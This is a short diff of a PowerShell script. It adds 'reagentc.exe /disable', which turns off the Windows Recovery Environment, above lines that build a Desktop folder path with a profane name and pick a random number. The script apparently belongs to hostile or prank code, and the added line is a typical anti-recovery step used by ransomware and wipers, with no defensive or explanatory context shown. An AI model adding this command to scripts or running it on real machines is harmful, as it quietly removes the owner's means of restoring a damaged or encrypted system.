@@ -1,3 +1,5 @@
+reagentc.exe /disable
+
 $desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), 'hai1723fuckyou')
 $random = Get-Random -Minimum 1000 -Maximum 9999
 
